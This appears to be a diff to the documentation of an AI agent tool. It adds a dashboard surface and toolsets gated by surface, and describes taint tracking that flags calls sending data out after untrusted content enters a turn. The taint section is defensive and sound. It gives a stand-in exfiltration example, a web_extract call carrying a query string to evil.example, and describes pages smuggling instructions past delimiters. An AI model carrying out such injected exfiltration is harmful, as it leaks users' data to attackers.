@@ -54,6 +54,7 @@ where `core` stands for the surface's built-in default:
 | line chat and one-shot runs | `cli` | `core` |
 | terminal UI | `tui` | `core` |
 | desktop app | `desktop` | `core` |
+| web dashboard chat | `dashboard` | `core` |
 | scheduled jobs | `cron` | `core` |
 | API server | `api` | `api_server` (`core` without [`text_to_speech`](../reference/tools.md#text_to_speech), [`clarify`](../reference/tools.md#clarify), [`computer_use`](../reference/tools.md#computer_use)) |
 | ACP editors | `acp`, `acp_unattended` | `acp` (the `coding` tools), `acp_unattended` (no shell or code execution) |
@@ -88,6 +89,15 @@ Disabling `core` itself or a single-purpose toolset removes all of its
 tools. A toolset an enabled plugin registers joins every session except
 webhook-triggered runs; one named after a messaging platform joins only
 that platform's sessions, through its bundle.
+
+Some toolsets are surface-gated: a session gets them from its own
+surface, never from `all`, a toolset list, an environment variable or the
+process it runs in. Desktop sessions fold in `desktop_ui`, `project` and
+`catalog` (the onboarding chat also `onboarding`), TUI sessions `project`
+and `catalog`, dashboard sessions `project`; every other surface (a CLI
+session with `tools.enabled_toolsets = ["all"]` included) gets none of
+them, and none is part of `core`. `tools.disabled_toolsets` still removes
+a gated toolset from the surfaces that would fold it in.
 
 `prometheus tools summary` prints, per surface, the toolsets its sessions
 start from, the provider of each tool category they use and every selected
@@ -391,3 +401,23 @@ connectors and files read outside the session's workspace are
 session's nonce declared once in its system prompt, and any delimiter text
 inside the content is escaped so a page cannot close its block and smuggle
 instructions after it.
+
+Once an untrusted result enters a turn, the turn is tainted until it
+ends. A later call in it that sends data out of the machine is flagged: a
+tool whose `effect` is `external` (its target is the host of the URL it
+names, else the command it runs, else the tool) and any call naming a URL
+with a query string (`web_extract` of `https://evil.example/?q=...`
+carries the query to that host). `approvals.taint_policy` decides:
+
+```toml
+[approvals]
+taint_policy = "ask"   # warn (default), ask or off
+```
+
+`warn` records the flag with the call's result in the trajectory
+(`tool.result` `taint`) and adds it to any approval prompt the call raises
+for another reason; `ask` also requires a human approval before each
+flagged call whose target this session has not approved (`session` or
+`always` remembers the target; the smart-mode guardian never answers
+these, and an unattended run follows its approvals mode); `off` does not
+track.
